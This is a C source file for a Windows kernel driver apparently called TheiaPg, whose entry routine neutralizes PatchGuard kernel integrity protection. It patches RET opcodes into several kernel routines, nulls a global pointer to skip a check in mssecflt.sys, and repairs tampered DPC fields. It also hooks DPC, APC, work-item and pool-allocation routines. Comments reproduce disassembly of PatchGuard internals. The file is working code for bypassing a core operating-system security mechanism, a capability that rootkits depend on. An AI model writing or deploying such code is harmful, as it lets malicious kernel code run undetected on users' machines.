#include "LinkHeader.h"
  
/**
* Routine: TheiaEntry
*
* MaxIRQL: DISPATCH_LEVEL
*
* Public/Private: Public
*
* @param NoParams
*
* Description: TheiaEntry routine.
*/
VOID TheiaEntry(VOID)
{
    #define ERROR_THEIA_ENTRY 0xd1baa81aUI32

    CONST UCHAR RetOpcode = 0xc3UI8;
    CONST UCHAR StopSig[3] = { 0xcc,0xcc,0xcc };

    ICH_DATA ICH = { 0 };

    INDPN_RW_V_MEMORY_DATA DataIndpnRWVMem = { 0 };
    DataIndpnRWVMem.FlagsExecute = MEM_INDPN_RW_WRITE_OP_BIT;
    DataIndpnRWVMem.pIoBuffer = &RetOpcode;
    DataIndpnRWVMem.LengthRW = 1UI64;

    InitTheiaContext();

    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiMcaDeferredRecoveryService;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiMcaDeferredRecoveryService\n"); 
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pFsRtlUninitializeSmallMcb;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixFsRtlUninitializeSmallMcb\n");
    HrdIndpnRWVMemory(&DataIndpnRWVMem);

    DataIndpnRWVMem.pVa = g_pTheiaCtx->pFsRtlTruncateSmallMcb;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixFsRtlTruncateSmallMcb\n");  
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiDecodeMcaFault;  
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiDecodeMcaFault\n");  
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pCcBcbProfiler;  
    DbgLog("[TheiaPg <+>] TheiaEntry: FixCcBcbProfiler\n");  
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pCcBcbProfiler2;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixCcBcbProfiler2\n");
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiDispatchCallout;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiDispatchCallout\n");
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiSwInterruptDispatch;
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiSwInterruptDispatch\n"); 
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixMaxDataSize\n");
    
    //
    // Nulling gMaxDataSize is necessary to neutralize the PG check routine,
    // which is called through a global pointer in the kernel module mssecflt.sys and checks MaxDataSize is NULL, if NULL is detected
    // then the execution of the check routine logically jump to epilog, unlike KiSwInterruptDispatch:
    // 
    // KiSwInterruptDispatch:
    // 
    // .text:00000001405081BD 158 48 8B 3D 84 D8 AB  mov     rdi, cs:MaxDataSize (gPgCtx)
    // .text:00000001405081BD 158 00                 
    // .text:00000001405081C4 158 4C 8B E9           mov     r13, rcx
    // .text:00000001405081C7 158 F7 87 DC 09 00 00  test    dword ptr [rdi+9DCh], 100000h ; Logical Compare
    // 
    // 
    // sub_?????????: (PgCallBackRoutine)
    // 
    // .text:0000000140509CFA 788 48 8B 35 47 BD AB  mov     rsi, cs:MaxDataSize 
    // .text:0000000140509CFA 788 00
    // .text:0000000140509D01 788 F0 44 09 3C 24     lock or [rsp+780h+var_780], r15d ; Logical Inclusive OR
    // .text:0000000140509D06 788 48 85 F6           test    rsi, rsi ; Logical Compare
    // .text:0000000140509D09 788 75 0A              jnz     short loc_140509D15 ; Jump if Not Zero (ZF=0)
    // .text:0000000140509D0B 788 B8 A3 00 00 C0     mov     eax, 0C00000A3h
    // .text:0000000140509D10 788 E9 FA E6 00 00     jmp     loc_14051840F ; Jump
    //
    *(PULONG64)g_pTheiaCtx->ppMaxDataSize = NULL; ///< pp: pointer to pointer.
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixPgPrcbFields\n");
    
    g_pTheiaCtx->pKeIpiGenericCall(&SearchKdpcInPgPrcbFields, NULL);

    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiBalanceSetManagerPeriodicDpc\n");

    if (((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredRoutine != g_pTheiaCtx->pKiBalanceSetManagerDeferredRoutine)
    {
        DbgLog("[TheiaPg <+>] TheiaEntry: Detect PG-DeferredRoutine in KiBalanceSetManagerPeriodicDpc | DeferredRoutine: 0x%I64X\n", ((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredRoutine);

        DataIndpnRWVMem.pVa = ((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredRoutine;

        HrdIndpnRWVMemory(&DataIndpnRWVMem);

        ((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredRoutine = g_pTheiaCtx->pKiBalanceSetManagerDeferredRoutine;
    }
    else if ((((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredContext != g_pTheiaCtx->pKiBalanceSetManagerPeriodicEvent))
    {
        //
        // If the DeferredContext field represents a value that does not have a canonical part inherent to VA-UserSpace/KernelSpace, 
        // then KiCustomAccessRoutineX from __try (SEH) is called:
        // ###
        // 
        // LONG __fastcall KiBalanceSetManagerDeferredRoutine(PKDPC pDpc (RCX), PKEVENT DeferredContext (RDX), PVOID SystemArgument1 (R8), PVOID SystemArgument2 (R9))
        // {
        //     _DWORD v9[22]; // [rsp+0h] [rbp-158h] BYREF
        //     _BYTE v10[55]; // [rsp+90h] [rbp-C8h] BYREF
        //     __int64 v11; // [rsp+C7h] [rbp-91h]
        //     __int64 v12; // [rsp+E7h] [rbp-71h]
        //     _DWORD* v13; // [rsp+140h] [rbp-18h]
        // 
        //     v13 = v9;
        //     memset_0(v10, 0, 0x5Fu);
        // 
        //     ##
        //     ## It is the high-entropy encrypted BaseVa-PgCtx passed via DeferredContext that will cause an exception in the __unwind block later in the recursive call loop of one of the KiCustomRecurseRoutineX.
        //     ##
        //     if ((__int64)DeferredContext >> 47 != 0xff && (__int64)DeferredContext >> 47 != 0x00) ###< Checking the canonical part (VA-KernelSpace/UserSpace) of the DeferredContext value.
        //     {
        //         v9[12] = 0;
        //         *(_BYTE*)pDpc = 0;
        //         *(_QWORD*)(pDpc + 32) = SystemArgument2 >> 8;
        //         v12 = SystemArgument1;
        //         v11 = __ROL8__(DeferredContext, SystemArgument1);
        //         *(_QWORD*)&v10[31] = __ROR8__(pDpc, SystemArgument1);
        //         *(_QWORD*)(a1 + 40) ^= SystemArgument2;
        //         *(_QWORD*)(a1 + 48) ^= SystemArgument1;
        //         KiCustomAccessRoutine6(DeferredContext); ###< Call the caller KiCustomRecurseRoutineX.
        //     }
        // 
        //     return KeSetEvent(DeferredContext, 10, 0);
        // }
        // 
        // ###
        // This means that PgInitRoutine may not overwrite the DeferredRoutine field with one of the PgDpcRoutines instead,
        // the DeferredContext field may be passed an encrypted BaseVa-PgCtx that initiates the launch of the check procedures.
        //
        DbgLog("[TheiaPg <+>] TheiaEntry: Detect PG-DeferredContext in KiBalanceSetManagerPeriodicDpc | DeferredContext: 0x%I64X\n", ((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredContext);

        ((PKDPC)g_pTheiaCtx->pKiBalanceSetManagerPeriodicDpc)->DeferredContext = g_pTheiaCtx->pKiBalanceSetManagerPeriodicEvent;
    }
    else { VOID; } ///< For clarity.

    ICH.pHookRoutine = &FltrKiExecuteAllDpcs;
    ICH.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pKiExecuteAllDpcs, g_pTheiaCtx->TheiaMetaDataBlock.KIEXECUTEALLDPCS_SIG, g_pTheiaCtx->TheiaMetaDataBlock.KIEXECUTEALLDPCS_MASK, &StopSig, sizeof StopSig);
    
    if (!ICH.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for hook KiExecuteAllDpcs not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.KIEXECUTEALLDPCS_HANDLER;
    ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.KIEXECUTEALLDPCS_LEN_HANDLER;
    ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.KIEXECUTEALLDPCS_HOOK_ALIGNMENT;
    
    InitCallHook(&ICH);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FltrKiExecuteAllDpcs is init\n");
  
    ICH.pHookRoutine = &FltrKiRetireDpcList;
    ICH.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pKiRetireDpcList, g_pTheiaCtx->TheiaMetaDataBlock.KIRETIREDPCLIST_SIG, g_pTheiaCtx->TheiaMetaDataBlock.KIRETIREDPCLIST_MASK, &StopSig, sizeof StopSig);
    
    if (!ICH.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for hook KiRetireDpcList not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.KIRETIREDPCLIST_HANDLER;
    ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.KIRETIREDPCLIST_LEN_HANDLER;
    ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.KIRETIREDPCLIST_HOOK_ALIGNMENT;
    
    InitCallHook(&ICH);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FltrKiRetireDpcList is init\n");

    ICH.pHookRoutine = &FltrKiDeliverApc;
    ICH.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pKiDeliverApc, g_pTheiaCtx->TheiaMetaDataBlock.KIDELIVERAPC_SIG, g_pTheiaCtx->TheiaMetaDataBlock.KIDELIVERAPC_MASK, &StopSig, sizeof StopSig);

    if (!ICH.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for hook KiDeliverApc not found\n");

        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }

    ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.KIDELIVERAPC_HANDLER;
    ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.KIDELIVERAPC_LEN_HANDLER;
    ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.KIDELIVERAPC_HOOK_ALIGNMENT;

    InitCallHook(&ICH);

    DbgLog("[TheiaPg <+>] TheiaEntry: FltrKiDeliverApc is init\n");

    ICH.pHookRoutine = &FltrExQueueWorkItem;
    ICH.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pExQueueWorkItem, g_pTheiaCtx->TheiaMetaDataBlock.EXQUEUEWORKITEM_SIG, g_pTheiaCtx->TheiaMetaDataBlock.EXQUEUEWORKITEM_MASK, &StopSig, sizeof StopSig);

    if (!ICH.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for hook ExQueueWorkItem not found\n");

        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }

    ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.EXQUEUEWORKITEM_HANDLER;
    ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.EXQUEUEWORKITEM_LEN_HANDLER;
    ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.EXQUEUEWORKITEM_HOOK_ALIGNMENT;

    InitCallHook(&ICH);

    DbgLog("[TheiaPg <+>] TheiaEntry: FltrExQueueWorkItem is init\n");

    ICH.pHookRoutine = &FltrExAllocatePool2;
    ICH.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pExAllocatePool2, g_pTheiaCtx->TheiaMetaDataBlock.EXALLOCATEPOOL2_SIG, g_pTheiaCtx->TheiaMetaDataBlock.EXALLOCATEPOOL2_MASK, &StopSig, sizeof StopSig);
    
    if (!ICH.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for hook ExAllocatePool2 not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.EXALLOCATEPOOL2_HANDLER;
    ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.EXALLOCATEPOOL2_LEN_HANDLER;
    ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.EXALLOCATEPOOL2_HOOK_ALIGNMENT;
    
    InitCallHook(&ICH);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FltrExAllocatePool2 is init\n");
 
    do
    {
        LONG32 SaveRel32Offset = 0I32;
        PVOID pCurrentRecurseRoutine = NULL;
        BOOLEAN IsFirstIteration = FALSE;
    
        for (; ;)
        {
            if (!IsFirstIteration)
            {
                IsFirstIteration = TRUE;
    
                ICH.pHookRoutine = &FltrKiCustomRecurseRoutineX;
                ICH.pBasePatch = g_pTheiaCtx->pKiCustomRecurseRoutineX;
                ICH.pHandlerHook = g_pTheiaCtx->TheiaMetaDataBlock.KICUSTOMRECURSEROUTINEX_HANDLER;
                ICH.LengthHandler = g_pTheiaCtx->TheiaMetaDataBlock.KICUSTOMRECURSEROUTINEX_LEN_HANDLER;
                ICH.LengthAlignment = g_pTheiaCtx->TheiaMetaDataBlock.KICUSTOMRECURSEROUTINEX_HOOK_ALIGNMENT;
    
                pCurrentRecurseRoutine = g_pTheiaCtx->pKiCustomRecurseRoutineX;
    
                SaveRel32Offset = *(PLONG32)((PUCHAR)pCurrentRecurseRoutine + 5);
    
                pCurrentRecurseRoutine = (PVOID)(((ULONG64)pCurrentRecurseRoutine + 9) + ((SaveRel32Offset < 0I32) ? ((ULONG64)SaveRel32Offset | 0xffffffff00000000UI64) : (ULONG64)SaveRel32Offset));
            }
            else
            {
                if (pCurrentRecurseRoutine == ((PUCHAR)g_pTheiaCtx->pKiCustomRecurseRoutineX - 4)) { break; }
    
                ICH.pBasePatch = ((PUCHAR)pCurrentRecurseRoutine + 4);
    
                SaveRel32Offset = *(PLONG32)((PUCHAR)pCurrentRecurseRoutine + 9);
    
                pCurrentRecurseRoutine = (PVOID)(((ULONG64)pCurrentRecurseRoutine + 13) + ((SaveRel32Offset < 0I32) ? ((ULONG64)SaveRel32Offset | 0xffffffff00000000UI64) : (ULONG64)SaveRel32Offset));
            }
    
            InitCallHook(&ICH);
        };
    
        DbgLog("[TheiaPg <+>] TheiaEntry: FltrKiCustomRecurseRoutineX is init\n\n");
    
    } while (FALSE);

    InitSearchPgSysThreads();

    return;
}
